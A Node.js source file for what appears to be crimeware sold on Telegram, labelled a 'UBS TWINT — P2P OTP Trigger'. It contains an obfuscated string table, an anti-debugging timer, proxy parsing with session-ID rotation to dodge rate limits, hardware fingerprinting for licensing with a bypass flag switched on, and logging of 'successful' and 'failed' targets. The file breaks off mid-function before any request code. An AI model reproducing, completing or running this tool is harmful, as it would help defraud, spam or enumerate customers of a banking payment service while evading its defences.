'use strict';
const fs = require('fs'),
  path = require("path"),
  https = require("https"),
  http = require("http"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  os = require('os'),
  readline = require("readline");
const {
    execSync
  } = require("child_process"),
  requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
function fn1() {
  const v1 = ['ywrKtg9N', 'E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'z21zveC', 'r0HmC24', 'CfjnCuW', 'B3j6v2C', 'sxbhruO', 'BgvUz3rO', 'u0vmrunuie5vtujfuIbtt1vsq0u', 'icdINjmGtgLJzw5ZztOG', 'iokgKIa', 'y2PKDMG', 'Aw5PDa', 'DxbKyxrL', 'mZi5mNPfEvreAq', 'Dg9tDhjPBMC', 'u2X0q2e', 'mta4odKXmKrTAwDRDq', 'i0zgrdCWma', 'g1SWBqO', 'uKndvui', 'Dg9vChbLCKnHC2u', 'icdILOJILOJILzCGicdILOJILOJILzFILOJILOJILOJILOJILOJILOJILzCG4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4Pwx', 't3jzCLq', 'z3jcww0', 'Dg90ywXoDw1IzxjZ', 'zfbsEwO', 'ywXS', 'ywn0Aw9U', 'DMvYAwz5', 'BxzptNe', 'C3rVCa', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYifnVDxjJzq', 'icGR', 'iokgUYbty3jHCgvYieTPBMC', 'Ag9ZDa', 'yteYlJaUma', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'ChjVEgLLC0zPBgu', 'r0LVtwe', 'zMXVB3i', 'zw4Tq0G', 't2fuzLC', 'zwjdDxa', 'r0vzrfm', 'tgLJzw5Zzwq', 'DMvYC2LVBG', 'yteZlJaUma', 'Fe9uuf9tru5u', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 'ww1kzfq', 'A2LoENi', 'CMvUzgvY', 'v09Nv3C', 'zM9YrwfJAa', 'suPzuLm', 'y2f0y2G', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'C1fLAMS', 'iokCLYbty3jHCgvYieTPBMC', 'AgvHzgvYCW', 'Agv4', 'CMvWzwf0', 'lxnLC3nPB24T', 'C2XPy2u', 'AM9PBG', 'zg93BG', 'zxHPDa', 'D2LUmZi', 'qvbbvLm', 'B3jPz2LUywW', 'DgLTzw91Da', 'i0zgndq2nG', 't3Pzwwi', 'BK9OyLO', 'qMruBgu', 'z3vUEMLWu3LUyW', 'icdILOJILOJILzeGicdILOJILOJILzhILOJILOJILztILzdILzdILOJILOJILzCGicdILOJILOJILzeGica', 'B2TODhrWlZuUmY4W', 'Dg91vMvYC2LVBG', 'qMfKifvstdOG', 'mZaXode4nKPbrNbJEa', 'vw5RBM93BKnqvq', 'u0vmrunuifbst1HjrvmGrKLmrq', 'y2HHAw4', 'uMf3ANe', 'C3rHDgvpyMPLy3q', 'zw5K', 'Ahr0Chm6', 'mtHTANHcvKW', 'BM93', '8j+AQYboB25LicHeAxjLy3qGq29UBMvJDgLVBIK', 'g1SWBsa', 'iokuGIa', 'y29UC3rYDwn0B3i', 'Aw52ywXPzf9PBNb1Da', 'lxnZAwqT', 'CgfKrw5K', 'y2fSBa', 'B2TODhrWlZuUmc4WlwfSCgHHlJe0', 'CYKk', 'drTBsW', 'tM8GAgfYzhDHCMuGzgf0yq', 'l2v0yY9TywnOAw5LlwLK', 'zMfPBgvKlNr4Da', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', 'v1rNBe0', 'CMvZB2X2zq', '4PscifVIGkjDifzLCNnPB24Gica6ia', 't1rqifnLBNq', 'y3LHBG', 'mtbvzNb3rg0', 'yxbWx2LK', 'CMfUzg9T', 'Ahr0Chm6lY8', 'C3vIC3rYAw5N', 'zgvIDq', 'sKTUuwq', '4PYp77Ipien1C3rVBsbgAwXLifbHDgG', 'icaG4PwA4Pwq4Pwq4Pwq4Pwq4Pwq4PwDiokvMUkvKokvKokvKokvKokvKokvNsaGicdILzRILzdILz0Gicak', 'BwLU', 'yvPsuK0', 'uxjqwfy', 'cLTtrvrvuf0GrMLYC3qGDgLTzsbZzxr1CdOGsw5ZDgfSBgLUzYbYzxf1AxjLzcbKzxbLBMrLBMnPzxmUlI4', 'ELbXEe4', 'g1SYsW0k', 'wfvmDgK', 'oI8V', 'iokUNIa', 'ls0Tls1cruDjtIbqvujmsumGs0vzls0Tls0ktunVD0jrwurlmLz3qxLfquLvn1bJnZvHBYTgBJDyr0m3A0zhzurOn0PbCZnVne5ttdjmz21omfLTzLK9cI0Tls0Tru5eifbvqKXjqYblrvKTls0Tlq', 'zxjZBKC', 'CMvZzw5KrgvSyxK', 'Bwv0Ag9K', 'BvjqtgG', 'icdILzRILOJILOJILOJILOJILOJILOJILztILz3ILOJILOJILOJILOJILOJILOJILztILz0GicdILOJILOJILzeGica', 'C2LN', 'ChvZAa', 'C3rYAw5NAwz5', 'vhbKBgu', 'z2DLCG', 'ChjVDg9JB2W', 'txLxANG', 'u0TjtKCTrevwlujzueftuW', 'EMXPyG', 'C3vJy2vZC2z1BfjLC2vUzhm', 'vgLTzw91Da', 'DuL6qNy', 'ChjVEgLLCY50Ehq', 'qLjztNO', '4PscifVIGkjDief1DgHVCIaGica6ia', 'rMfPBgvK', 'C2P0yK4', '4PscifVIGkjDifLVDxiGsfDjrca6ia', 'C29JA3m1', 'vg90ywWGvgLTzq', 'Dg90ywXTzw0', 'yMfKx2PZB24', 'C2v0u3rHDhvZ', 'CMvSzwfZzq', 'B2TODhrWlZqUmteUma', 'rgv2zwXVCgvYicHcExbHC3nLzcK', '8j+uGsbdDxn0B20GuMvZzw5KieXVB3aGke11BhrPCgXLihjLC2vUzhmGCgvYig51BwjLCIK', 'uwLqrg4', 'DgL1vuq', 'CgHVBMu', 'rw50zxiGuhjVEgLLCYbgAwXLifbHDgG6', 'wKfky2G', '4OYO77Ipien1C3rVBs4UlG', 'AvDnCve', 'AxHxtMW', 'rwPNy3G', 'CgLWzq', 'ihrHCMDLDhmGzNjVBsa', 'Awn3Dfe', 'q29UDgvUDc1mzw5NDgG', 'BfbLqK4', 'icaGg1SZm20', 'r0vu', 'tfjuv1u', 'CfLcB0q', 'Ag9ZDg5HBwu', 'icdILOJILOJILzeGicdILOJILOJILzhILOJILOJILztILzdILzdILOJILOJILzFILzRILzdILzdILOJILOJILztILzdILzdILz0', 'z1b6u3a', 'Au9hA1y', 'yMfZzty0', 'tenmq1y', 'u0vmrunuifriuKvbrfm', 'D2HPBguGkhrYDwuPihT9', 'y29Uy2f0', 'tM9bEM0', 'y291BNrLCG', 'CYbJB29Szg93BIbIzwzVCMuGCMvZzw5Kia', 'AuXYDxe', 'C3vJy2vZC2z1Bc50Ehq', 'C3bSAxq', 'B2TODhrWlZqUmtiUma', 'odfpzu1UEKe', 'CMvXDwvZDa', 'zgv2AwnLswq', 'CgfYC2u', 'Dwj0', 'zgvZDhjVEq', 'yxbWzw5KrMLSzvn5BMm', 'CMvZzw5KxZe', 'icboBYbWCM94AwvZignVBMzPz3vYzwqGkhj1BM5PBMCGzgLYzwn0kq', '4PYtifrOCMvHzhmGoIa', 'C2vHCMnO', 'v3jPDguTt3v0Chv0icGOjg1NlcrJChuSjgrPC2SSjg1IksaTAM9PBIaNFcCPiG', 'AgngvgW', 'BNvTyMvYC0zPBgu', 'EwrSvvm', 'ywDLBNq', 'yvHLr1a', 'BNrdtM4', 'g1SWBq', '4PYtifjLC2vUzcaGoIbfBMfIBgvKicG', 'ntaGvgHYzwfKCYaOrMfZDcK', 'w0vsuK9sxsbgywLSzwqGDg8GAw5ZDgfSBcbKzxbLBMrLBMnPzxmUie1HA2uGC3vYzsboB2rLlMPZigfUzcboue0GyxjLigLUC3rHBgXLzcbWCM9WzxjSEs4', 'svbjD0i', 'xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq', 'mZeYqvP3DvPf', '4QYf77IpieDViejHy2SGDg8GuhjVEgLLCYbtzwXLy3rPB24', 'CMvHzezPBgvtEw5J', 'y1HnA2i', '4PYtieXVywrLzca', 'u0vmrunuie9uucbesvnqqvrdscaVifjfu0vorcbnt0rf', 'Bw9KzwW', 'tgf6wfO', 'yMfUBMvK', 'EfrSvxu', 'DxnLCG', 'v3Pey3G', 'B3nwzxjZAw9U', 'B2TODhrWlZqUos4Z', 'AvPQBfC', 'icdINjmGqwn0AxzLierVBwfPBJOG', 'q3PXzgy', 'DxnLCKfNzw50', 'CMv0CNK', 'q1HHBMq', 'DNHREwW', 'zg9zsKi', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'l1aYufbHEw1LBNrtExn0zw0Vudjqsw50zxjMywnLuhvIBgLJl1yXmdaVudjqsw50zxjMywnLuhvIBgLJl2nYzwf0zvaYuefJy291BNq', 'rKv5z0e', 'cIaG4PYxifvUyxv0Ag9YAxPLzcbiyxjKD2fYzs4Gq29UDgfJDcb0lM1Ll3nJCMfWzxjFA2LUzWO', 'C2HPzNq', 'icaG', 's2vLCc1bBgL2zq', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'zgvMBgf0zq', 'zNjVBq', 'yNHjAxm', 'B2TODhrWlZqUmtaUma', 'zvDnsLi', 'sND4B0G', 'g1SYsHTBsa', 'uw1uBfi', 'wKDOufi', 'iZu1ntu1nq', 'qwnJzxb0luvUy29KAw5N', 'z3PPCcWGzgvMBgf0zq', 'zw5KC1DPDgG', 'zu9rBu0', 'D3zevKe', 'zgvIDwCUDhH0', 'ALnjtNG', 'D3jPDgvgAwXLu3LUyW', 'vMvYAwz5Aw5NieXPy2vUC2uUlI4GicaGicaGica', 'C3rKAw8', 'zgf0yq', 'qxbJugW', 'z3jHEq', 'nZyWodC4r09zB3v0', 'uMvZzw5Kia', 'z0XfveO', 'icaGg1SZnM3INPqBwZm1Bsa', 'r3r3uxO', 'CMvZzw5Kx2n1C3rVBq', 'lwzHAwXLza', 'sfruuca', 'Ahr0Chm6lY90D2LUDc51yNmUy29Tl2LPENDSBq', 'C29JA3mTChjVEhKTywDLBNq', 'rMfPBgvKig9Uia', 'Aw5OzxjPDa', 'zNvUy3rPB24GkLWOicPCkq', 'uxbPCum', 'AxnuvfK', 'Ahr0CdOVlW', 's29nCKq', 'yM9Sza', 'BwfW', 'rgnSCgG', 'C3rYAw5N', 'C29JA3m0', 'y3j5ChrV', 'ELfktw8', 'uLbfrwy', 'EKD0Cxm', 'yxbWvMvYC2LVBG', 'z3jLzw5cCMLNAhq', 'Cgf0Ag5HBwu', 'q3nIwuC', 'y2HHBgS', 'ChjVy2vZC2vK', 'tvfOExa', 'BM9Uzq', 'mJaGvgHYzwfKCYaOrgvMyxvSDcK', 'vujulvyXlJaUmcaGicaGicaGicaGicaGicaGica', 'EvvQEMe', 't0fJwuu', 'iZG4odG4oa', 'B2jQzwn0', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 'z3PPCa', 'w1nfvfvqxsbezxbLBMrLBMnPzxmGAw5ZDgfSBgvKihn1y2nLC3nMDwXSEsek', 'rxLlEvK', 'icbdB25Uzwn0Aw5NihrVifvcuYbuv0LovcbHy3rPDMuGzg9TywLUlI4U', 'yMfZzw5HBwu', 'AhDPza', 'Ffjfu0vorfm6', 'BNvTyMvYCY50Ehq', 'mtaWifrOCMvHzhmGkev4DhjLBwuP', 'icbqCM94AwvZigXVywrLzdOG', 'zxjYB3i', 'iZmZmZmZmW', 'mJmZmdmWD090s0TS', 'mJaYlJaUmc4YmJu2mq', 'DhLWzq', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'tgjIvKW', 'CMvWBgfJzq', 'CMfUzg9TqNL0zxm', 'DMfSDwu', 'AhbAAe0', 'CMvK', 'EvbXrLu', 'cIaG4PYxifnPz25HDhvYzsb2zxjPzMLJyxrPB24GzMfPBgvKlGO', 'CMvZDwX0vhLWzq', 'Bg9N', 'D3bNCw4', 't015sfq', 'yxjNDG', 'mJa3ndfKEvrfCLK', 'ue9tva', 'DhjPBq', 'icaGicaGia', 'uhjLBwL1BsbmAwnLBNnLicaGicaGicaGicaGica', 'Ahr0Ca', 'Cgf0Aa', 'Cg9YDa', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYCYbtzwXLy3rPB24', '4PscifVIGkjDifrVB2WGicaGica6ia', 'y3rYBa', 'BwTksha', 'zfvAqwG', 'cUkCLYbfCNjVCJOGtNvTyMvYCYbMAwXLig5VDcbMB3vUzdOG', 'rMf0ywWGzxjYB3iGB24G', 'zgLNzxn0', 'g1SYsHTBm0OBw0G', 'u0TjtKCT', 'yNjVDgXPrgvJB21WCMvZC1n5BMm', 'C3vJy2vZCW', 'BuLLuuS', 'BufXwuO', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'zNvfr0m', 'u290vuq', 'EcbWzxiGBNvTyMvYlcbJB29Szg93BJOG', 'lI4U', 'D2HPDgu', 'ms4WlJa', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'zxHPC3rZu3LUyW', 'BNbTigLUC3rHBgWGAhr0ChmTChjVEhKTywDLBNqGC29JA3mTChjVEhKTywDLBNqGy2HHBgTana', 'icaGicaGicaGicaGicaGicaGicaGica', 'Aw5JBhvKzxm', 'CMvHzgXPBMu', 'BNDPB2i', 'CMv0DxjU', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'B2TODhrWlZuUmY4X', 'swzivLa', 'lwvYCG', 'y0XNrNu', 'yxbWBgLJyxrPB24VANnVBJSGy2HHCNnLDd11DgyToa', 'zLvMrLq', 'Dg9mB3DLCKnHC2u', 'vujtifrxsu5uie9uucbuCMLNz2vYicaGicaGica', 'kZqX', 'CgXHDgzVCM0', 'yxbWBgLJyxrPB24VANnVBIWGkI8Qo3e9mc44', 'l2fWAs92zxjPzNK', 'pt09ifvcvcberujvrYbtrvntsu9oia', 'rMf0ywWGzxjYB3i6ia', 'Bwf4', 'yxbWBgLJyxrPB24VANnVBG', 'i0zgnKiZnq', 'mtG4lJeZnY4XnZyUmtyZ', 'yxbPlxjLCW', 'vujtifrxsu5uiokaLcbqmLaGt1rqifrYAwDNzxiGia', 'Dg9ju09tDhjPBMC', 'yNL0zuXLBMD0Aa', 'CMvTB3zLtgLZDgvUzxi', 'D3Hft3G', 'icbvqLmGvfDjtLqGt1rqifrssuDhrviG4OcuienptvbmrvrficaGicaGicaGia', 'DhDPBNq0lNvICY5JB20', 'cUkCLYbfCNjVCJOGtM8GBNvTyMvYCYbMB3vUzcbPBIa', 'vvDYweO', 'ihWGsfDjrdOG', 'zMLSzq', 'C29JA3m1oI8V', 'rhH2CK8', 'mtaGvgHYzwfKCW', 'C2v0sw50zxj2ywW', 'sNvzvK0', 'rw50zxiGy3vZDg9Tig51BwjLCIbVzIb0AhjLywrZicH0ExbLicDIywnRjYb0BYbNBYbIywnRktO', 'y3jLyxrLsgfZAa', 'BgHZwuO', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'ifjLC2vUza', 'wg1SExu', 'zvj6r3O', 'yte0lJaUma', 's1LeugK', 'u3vJy2vZC2z1Ba', 'zK1JEM8', 'vLfsDKC', 'y3b1CW', 'yLfptKO', 'id09pqO', 'CdjWqwXPyxm', 'm3WYFdf8mhW0', 'vhjPz2DLCMvKie9uucbMB3iG', 'DxrMoa', 'B2TODhrWlZuUmY4Y', 't1P5ufe', 'y3vZDg9T', 'yMfJAW', 'C3rHDhvZ', 'icdILOJILOJILzeGicdILOJILOJILzhILOJILOJILOJILOJILOJILOJILztILz0GicdILOJILOJILzeGica', 'jgrPC2SGpsaOr2v0lunPBuLUC3rHBMnLifDPBJmYx0XVz2LJywXeAxnRic1gAwX0zxiGj0rLDMLJzuLepvWNqZPCjYCGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLzVBhvTzvnLCMLHBe51BwjLCJSG', 'BMfTzq', 'sxf6u0G', 'Cff5t3a', 'zuTzB1m', 'yxbWBhK', 'icdILze', 'qunusvzfre9nquLo', 'ihrYAwDNzxjLzcbMB3iG', 'yMDXr1i', 'CMvZDw1L', 'rw50zxiGtNvTyMvYCYbgAwXLifbHDgG6', 'Dxr0wha', 'DgvZDa', 'Ahr0ChmTChjVEhKTywDLBNq', 'xsbB', 'zMLSDgvY', 'C3rKB3v0', 'yvPquha', 'C2HHmJu2', 'wK9juMe', 'yxbPlxjLC2vUzc0', 'v2fPDgLUzYa', 'u2nYyxbLCIblAw5N', 'C3vJy2vZC2z1Ba', 'CgfZCW', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'uLvMCM4', 'sfzuswm', 'vhzkDeu', 'yvvZBxC', 'C2v0uMf3tw9Kzq', 'A0vqzMG', 'yxnZAwDU', 'CgfKu3rHCNq', 'C0Tcyxy', 'D2jnA0O', 'AhnjrLm', 'A2v5ChjLC3m', 'CM91BMq', 'r3DLqK4', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'uhLwrLO', 'C3rHDhvZq29Kzq', 'y2HPBgrFChjVy2vZCW', 'rw50zxiGy29VBgrVD24GyMvMB3jLifjLC2vUzcbPBIbZzwnVBMrZifTKzwzHDwX0oIaXnv06', 'odG2mtv1tKzRuhm', 'sg93ig1HBNKGuMvZzw5KCYbWzxiGBNvTyMvYpYbBzgvMyxvSDdOGmL06', 'zMfPBgvK', 'icaGicaBwZKWBq', 'vKHkDMW', 'rNbPrKm', 'ANzct3q', '4PYtifjLC2vUzcaGoIbeAxnHyMXLzcaOu2LUz2XLifnLBMqPcG', 'z0HQDKm', 'CKXitwC', 'mxW0Fdb8mNWZ', 'Bwf0y2G', 'D3jPDgu', 'BwvZC2fNzq', 'vhnRyK4', 'ruLuq3C', 'y29UDgvUDc1LBMnVzgLUzW', 'seTyBNa', 'Aw5WDxq', 'yLDtALq', 'iokCPIbty3jHCgvYieTPBMC', 'kcGOlISPkYKRksSK', 'whbstfK', 'C3rHCNrZv2L0Aa', 'x3nPzf8', 'CNPWEu0', 'CMvZzw5Kq291BNq', 'iZaWqZLbnW', 'BufWy0O', 'DgLTzxn0yw1W', 'CMv0DxjUicHMDw5JDgLVBIGPia', 'r0PStNC', 'AvnZtw4', 'C3rKAw4', 'BgfUz3vHz2u', '4P2miev4AxqGuhjVz3jHBq', 'Bw9nEuS', 'yLbsu2K', 'Aw5MBgf0zvn5BMm', 'r09h', 'Ahr0Chm', 'icdILiiGia', 'zgv2AwnLvhLWzq', 'cIaG4PYxieXPy2vUC2uGC2vYDMvYigLZign1CNjLBNrSEsb1BNjLywnOywjSzs4GugXLyxnLihrYEsbHz2fPBIbSyxrLCI4k', 'Dg9gAxHLza', 's0vkEuC', 'igzVCIa', 'icbB', 'qZPCv2LUzg93C1XtExn0zw0ZmLXxAw5KB3DZug93zxjtAgvSBfX2ms4WxhbVD2vYC2HLBgWUzxHLic1oB1bYB2zPBguGlunVBw1HBMqGiG', 'CMngEwq', '4QYf77IpieDViejHy2SGDg8GvgHYzwfKCYbtzwXLy3rPB24', 'rw50zxiGy29VBgrVD24GyMv0D2vLBIbszxnLBMrZigLUihnLy29UzhmGw2rLzMf1Bhq6ide1xtO', 'icdILztILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzC', 'DgHYzwfKCW', 'C3rHCNruAw1L'];
  fn1 = function () {
    return v1;
  };
  return fn1();
}
(function () {
  let v2;
  try {
    const v3 = Function('return (function() {}.constructor("return this")( ));');
    v2 = v3();
  } catch (v4) {
    v2 = window;
  }
  v2.setInterval(fn2, 0xdac);
})();
let missingModules = false;
for (const mod of requiredModules) {
  try {
    require.resolve(mod);
  } catch (v5) {
    missingModules = true;
    break;
  }
}
if (missingModules) {
  console.log("\n[SETUP] First time setup: Installing required dependencies...");
  try {
    const v6 = {};
    v6.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v6), console.log("[SETUP] Dependencies installed successfully!\n");
  } catch (v7) {
    console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(0x1);
  }
}
const chalk = require("chalk"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent"),
  B = chalk.hex("#00C9A7"),
  C = chalk.hex("#FFD700"),
  Y = chalk.hex("#FF6B35"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
let SUCCESSFUL_FILE = path.join(__dirname, "successful.txt"),
  FAILED_FILE = path.join(__dirname, "failed.txt"),
  DEBUG_FILE = path.join(__dirname, "debug.txt");
function debugLog(v8, v9, v10) {
  try {
    const v11 = new Date().toISOString(),
      v12 = '[' + v11 + "] [" + v8 + "] [" + v9 + ']\x0a' + (typeof v10 === "object" ? JSON.stringify(v10, null, 0x2) : String(v10)) + '\x0a' + '─'.repeat(0x50) + '\x0a';
    fs.appendFileSync(DEBUG_FILE, v12, "utf8");
  } catch (v13) {}
}
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(B("  ██╗   ██╗██████╗ ████████╗")), console.log(B("  ██║   ██║██╔══██╗╚══██╔══╝")), console.log(C("  ██║   ██║██████╔╝   ██║   ")), console.log(C("  ██║   ██║██╔══██╗   ██║   ")), console.log(Y("  ╚██████╔╝██████╔╝   ██║   "));
  console.log(Y("   ╚═════╝ ╚═════╝    ╚═╝   \n")), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
  console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│')), console.log(W("│ [•] Target    : ") + Y("UBS TWINT — P2P OTP Trigger  ") + W('│'));
  console.log(W("│ [•] Version   : ") + B("UBT-V1.0.0                   ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
function generateHWID() {
  const v14 = os.platform();
  try {
    if (v14 === "win32") {
      const v15 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
        'stdio': "pipe",
        'timeout': 0x3a98
      }).toString().trim();
      if (!v15) throw new Error("No hardware data");
      const v16 = crypto.createHash("sha256").update(v15).digest("hex").toUpperCase();
      return "SKING-" + v16.substring(0x0, 0x8) + '-' + v16.substring(0x8, 0xc) + '-' + v16.substring(0xc, 0x10);
    } else {
      let v17 = [];
      try {
        if (fs.existsSync("/etc/machine-id")) {
          const v19 = fs.readFileSync("/etc/machine-id", "utf8").trim();
          if (v19) v17.push('M:' + v19);
        }
      } catch (v20) {}
      try {
        const v21 = os.cpus(),
          v22 = v21 && v21.length > 0x0 ? v21[0x0].model : "UnknownCPU";
        v17.push('F:' + v22 + '|' + os.totalmem() + '|' + os.release() + '|' + os.hostname());
      } catch (v23) {}
      const v18 = crypto.createHash("sha256").update(v17.join('||')).digest("hex").toUpperCase();
      return "SKING-" + v18.substring(0x0, 0x8) + '-' + v18.substring(0x8, 0xc) + '-' + v18.substring(0xc, 0x10);
    }
  } catch (v24) {
    return "SKING-DEV-BYPASS";
  }
}
const BYPASS_LICENSE = true;
function verifyServerSignature(v25, v26) {
  if (!v26) return false;
  try {
    return crypto.verify(null, Buffer.from(v25, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v26, "base64"));
  } catch (v27) {
    return false;
  }
}
function parseProxy(v28) {
  if (!v28) return null;
  if (typeof v28 === "object") return v28;
  v28 = v28.trim();
  if (!v28) return null;
  let v29, v30, v31, v32;
  if (v28.includes("://")) v28 = v28.split("://")[0x1];
  if (v28.includes('@')) {
    const v34 = v28.split('@'),
      v35 = v34[0x0].split(':'),
      v36 = v34[0x1].split(':');
    v31 = v35[0x0], v32 = v35[0x1], v29 = v36[0x0], v30 = parseInt(v36[0x1]);
  } else {
    const v37 = v28.split(':');
    if (v37.length === 0x2) v29 = v37[0x0], v30 = parseInt(v37[0x1]);else {
      if (v37.length === 0x4) !isNaN(parseInt(v37[0x3])) && isNaN(parseInt(v37[0x1])) ? (v31 = v37[0x0], v32 = v37[0x1], v29 = v37[0x2], v30 = parseInt(v37[0x3])) : (v29 = v37[0x0], v30 = parseInt(v37[0x1]), v31 = v37[0x2], v32 = v37[0x3]);else v37.length === 0x3 && (v29 = v37[0x0], v30 = parseInt(v37[0x1]), v31 = v37[0x2]);
    }
  }
  if (!v29 || !v30) return null;
  const v33 = {};
  v33.type = "http";
  return v33.host = v29, v33.port = v30, v33.user = v31, v33.pass = v32, v33.original = v28, v33;
}
function rotateSessionId(v38) {
  if (!v38 || !v38.user) return v38;
  const v39 = {
    ...v38
  };
  const v40 = v39;
  if (v40.user.includes("-ssid-")) {
    const v41 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
    v40.user = v40.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v41);
  } else {
    if (v40.user.includes("-session-")) {
      const v42 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
      v40.user = v40.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v42);
    } else {
      if (/_sid_/i.test(v40.user)) {
        const v43 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
        v40.user = v40.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v43);
      }
    }
  }
  return v40;
}
function createProxyAgent(v44) {
  if (!v44) return null;
  const v45 = typeof v44 === "string" ? parseProxy(v44) : v44;
  if (!v45) return null;
  let v46 = '';
  return v45.type === "socks5" || v45.type === "socks4" ? (v46 = "socks5://" + (v45.user ? encodeURIComponent(v45.user) + ':' + encodeURIComponent(v45.pass || '') + '@' : '') + v45.host + ':' + v45.port, new SocksProxyAgent(v46)) : (v46 = "http://" + (v45.user ? encodeURIComponent(v45.user) + ':' + encodeURIComponent(v45.pass || '') + '@' : '') + v45.host + ':' + v45.port, new HttpsProxyAgent(v46));
}
async function selectOption(v47, v48) {
  return new Promise(v49 => {
    let v50 = 0x0;
    process.stdin.resume();
    readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn3 = () => {
      process.stdout.write("[2J[H"), printHeader();
      console.log("   [33m" + v47 + "[0m\n");
      v48.forEach((v51, v52) => {
        v52 === v50 ? console.log("   [36m➔[35m " + v51.name + "[0m") : console.log("     [90m" + v51.name + "[0m");
      });
    };
    fn3();
    const fn4 = (v53, v54) => {
      if (v54.ctrl && v54.name === 'c') process.exit(0x0);
      if (v54.name === 'up') v50 = (v50 - 0x1 + v48.length) % v48.length, fn3();else {
        if (v54.name === "down") v50 = (v50 + 0x1) % v48.length, fn3();else {
          if (v54.name === "return") {
            if (process.stdin.isTTY) process.stdin.setRawMode(false);
            process.stdin.removeListener("keypress", fn4), v49(v48[v50].value);
          }
        }
      }
    };
    process.stdin.on("keypress", fn4);
  });
}
async function promptText(v55, v56) {
  return new Promise(v57 => {
